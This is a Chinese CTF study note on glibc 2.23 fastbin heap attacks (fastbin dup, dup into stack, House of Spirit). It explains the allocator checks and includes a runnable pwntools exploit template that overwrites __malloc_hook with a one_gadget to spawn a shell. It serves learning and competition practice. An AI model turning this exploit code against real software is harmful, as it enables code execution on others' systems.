---
title: Fastbin attack —— fastbin dup / into stack / house of spirit
category: pwn
tags: [fastbin, double free, house of spirit, fastbin dup, 堆]
signals: [小块 malloc 后连续 free, double free 未被检测, 无 tcache 的 glibc 2.23 环境, 有 __malloc_hook 可写, 题目 32 位老 libc]
difficulty: hard
source: "CTF-Wiki Fastbin Attack / how2heap / ir0nstone"
tools: [pwntools, gdb, pwndbg, glibc-all-in-one]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样子）

- libc 版本为 2.23（无 tcache），或题目显式 `setenv("GLIBC_TUNABLES"...)` 关掉了 tcache。
- chunk size 在 `0x20 ~ 0x80`（fastbin 范围：`<= global_max_fast`，默认 `0x80`，即 malloc 请求 `<= 0x70` 左右）。
- 可以「free A, free B, free A」——经典的 double free 链条，且程序不检查。
- 程序只用 `free` 不用 `malloc` 的新块覆盖，或 free 后指针不清。
- 存在可写的 `__malloc_hook`（2.34 前），或需要往栈上写数据。

## 二、原理

fastbin 是 LIFO 单向链表，且 `free` 只检查**链头是否相同**：

```c
if (__builtin_expect (old == p, 0)) {
    errstr = "double free or corruption (fasttop)";
}
```

只比链头 → 中间隔一个再 free 就能绕过。

**fastbin dup**（double free）：

```text
free(A) -> [A]
free(B) -> [B, A]
free(A) -> [A, B, A]          ← A 出现两次
malloc() -> A
malloc() -> B
malloc() -> A                 ← 两个指针指向同一块，可 UAF 改 fd
```

**fastbin dup into stack**：拿到的 A 改 `fd` 指向目标（栈/`.bss`），连续 3 次 `malloc` 后第 3 次返回目标地址。

关键约束：**fastbin 的 `size` 字段校验**。`_int_malloc` 会检查：

```c
if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
    malloc_printerr ("malloc(): memory corruption (fast)");
```

所以伪目标地址必须「看起来像一个 chunk」：`*(target+8)` 的低 4 字节要落在合法 size 范围（2.23 只查 `>>4`，只要 `size & 0x7f` 落在对应 bin 即可）。`__malloc_hook - 0x23` 之所以经典，是因为该处恰有 `0x7f` 字节。

**House of Spirit**：伪造一个 chunk 头（`size` 合法）在可控内存（栈/`.bss`），然后把「指向它的指针」交给 `free`，从而把它塞进 fastbin，后续 `malloc` 返回**非堆区地址**。

## 三、checksec 判读与利用思路

```text
RELRO: Partial  Canary: No  NX: enabled  PIE: disabled   libc 2.23 无 tcache
```

线路：

1. **fastbin dup → `__malloc_hook` → one_gadget**（2.23 最经典）：
   - 目标 `__malloc_hook - 0x23`，往里写 `one_gadget`。
   - 下一次 `malloc` 触发 → shell。
2. **fastbin dup → 栈**：需要栈地址泄露，把返回地址换成 ROP 链。
3. **House of Spirit**：需要 `free` 的指针可控（如菜单题 `free(idx)` 的 idx 可被写、或 `free(ptr)` 中 ptr 来自输入）。
4. **fastbin dup → `.bss` 上的函数指针 / 结构体**：如果题目有 `void (*handler)(char*)` 之类的表。

判断 fastbin 范围：

```bash
# 2.23 默认 global_max_fast = 0x80，即请求 <= 0x68 左右进 fastbin
# 可以在 gdb 里确认：
p main_arena.max_fast   # 老版本 pwndbg
# 或看 free 后是否出现在 fastbins
```

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./pwn")
context.log_level = "info"

def start():
    return remote(args.HOST or "TARGET", int(args.PORT or 1337)) if args.REMOTE \
           else process()

libc = ELF("./libc-2.23.so", checksec=False)     # 题目给的 libc

# ---------- 菜单封装（按需改） ----------
def add(size, data=b""):
    p.sendlineafter(b"> ", b"1"); p.sendlineafter(b"size", str(size).encode())
    p.sendafter(b"data", data)

def delete(idx):
    p.sendlineafter(b"> ", b"2"); p.sendlineafter(b"idx", str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"idx", str(idx).encode())
    p.sendafter(b"data", data)

def show(idx):
    p.sendlineafter(b"> ", b"4"); p.sendlineafter(b"idx", str(idx).encode())
    return p.recvline()

SIZE = 0x60                       # 落在 fastbin 的请求大小

def fastbin_dup():
    """返回 A/B/C 的索引：free(A), free(B), free(A)"""
    add(SIZE)   # 0 = A
    add(SIZE)   # 1 = B
    add(SIZE)   # 2 = C
    delete(0)   # A
    delete(1)   # B
    delete(0)   # A 再次 → 链 [A, B, A]

def fastbin_dup_into(target_addr):
    """
    经典三步：
      1) 伪造 A 的 fd 指向目标（目标需满足 *(target+8) 是合法 size）
      2) 连续 malloc 3 次，第 3 次拿到目标
      3) 在目标处写入想要的值
    """
    fastbin_dup()
    # 第 1 次 add 拿回 A，此时它还在链上，可以 edit 它的 fd
    add(SIZE, p64(target_addr))         # 0 -> A, fd = target
    add(SIZE)                           # 1 -> B
    add(SIZE)                           # 2 -> 目标地址（被当作 chunk）

def exp_malloc_hook(one_gadget_addr):
    """
    2.23 经典打法：把 __malloc_hook-0x23 处当作 fake chunk，
    再写 one_gadget 到 __malloc_hook。
    """
    libc.address = int(args.BASE or "0", 16)    # 占位：由泄露步骤填入
    fake = libc.sym["__malloc_hook"] - 0x23
    log.info(f"fake chunk @ {hex(fake)}  one_gadget @ {hex(one_gadget_addr)}")

    fastbin_dup()
    add(SIZE, p64(fake))                            # A.fd = fake
    add(SIZE); add(SIZE)                            # 拿回 B、再拿回 A
    # 下次 malloc 返回 fake 附近：0x23 偏移让 size 字段落在 __malloc_hook-0x13
    add(SIZE, b"A" * 0x13 + p64(one_gadget_addr))   # 0x13 + 0x10 头部命中 __malloc_hook
    p.sendlineafter(b"> ", b"1"); p.sendlineafter(b"size", b"8")   # 触发
    p.interactive()

# ---------- House of Spirit ----------
def house_of_spirit(stack_addr):
    """前提：能控制 free 的参数，且目标地址处可伪造 chunk 头
    1) 在 stack_addr-0x10 处写好 prev_size/size（size 必须属于某 fastbin）
    2) free(stack_addr) -> chunk 进 fastbin；3) malloc 同尺寸 -> 返回 stack_addr"""
    fake_chunk = stack_addr - 0x10
    payload = p64(0) + p64(SIZE + 1)      # prev_size, size（PREV_INUSE 置位）
    log.info(f"需要在 {hex(fake_chunk)} 布置: {payload.hex()}")
    return payload

def fastbin_ok(size_field):
    """目标地址 +8 处的 size 字段是否像合法 fastbin chunk"""
    size = u64(size_field) if len(size_field) == 8 else u32(size_field)
    return 0x20 <= (size & ~0xf) <= 0x80 and (size & 0xf) in (1, 0)

if __name__ == "__main__":
    p = start()
    # 先用 show 泄露 libc（fastbin 引用的地址高字节有 0x7f），再 exp_malloc_hook(one_gadget)
    exp_malloc_hook(0xdeadbeef)
```

在 gdb 里确认伪目标的 size 字段：

```bash
gdb -q ./pwn -ex 'b *main' -ex r -ex 'x/4gx 0x7ffff7dd1b10-0x23' -ex q
# 输出中 +8 偏移处的值必须像 0x7f / 0x21 这类合法 size
```

## 五、常见坑 / 变体

- **tcache 抢走 chunk**：2.26+ 的 tcache 优先，小 chunk free 后根本不进 fastbin。要先用 7 个同尺寸 chunk 填满 tcache。
- **double free 检测**：`fasttop` 只查链头，隔一个即可绕；但 2.29+ 的 `tcache` double-free 检测更严，需要配合 `key`。
- **size 校验失败**：`malloc(): memory corruption (fast)`。伪目标 `+8` 处必须像 `0x7f` 或 `0x21` 这类值；`__malloc_hook-0x23` 就是为这个挑的。
- **`__malloc_hook` 在 2.34 被删除**：老技巧直接失效，见 post-2.34 替代篇。
- **32 位与 64 位对齐**：32 位 fastbin 索引按 `size>>4`，伪造 size 要更小心（常配合 `0xfffffff` 截断）。
- **`free` 后再 `edit` 被禁用**：如果题目 `edit` 会校验 `inuse`，改用 `unsorted bin` / `tcache` 的路子。
- **`malloc_consolidate` 触发**：大 chunk 请求会把 fastbin 合并进 unsorted，导致伪造链失效，注意操作顺序。

## 六、参考来源

- [CTF-Wiki: Fastbin Attack](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/)
- [CTF-Wiki: Use After Free](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/)
- [how2heap 仓库（fastbin_dup.c / house_of_spirit.c）](https://github.com/shellphish/how2heap)
- [ir0nstone: Double Free](https://ir0nstone.gitbook.io/notes/binexp/heap/double-free)
- [ir0nstone: Double-Free Protections](https://ir0nstone.gitbook.io/notes/binexp/heap/double-free/double-free-protections)
- [ir0nstone: Operations of the Fastbin](https://ir0nstone.gitbook.io/notes/binexp/heap/bins/operations-of-the-fastbin)
- [0x434b: Overview of GLIBC heap exploitation techniques](https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/)
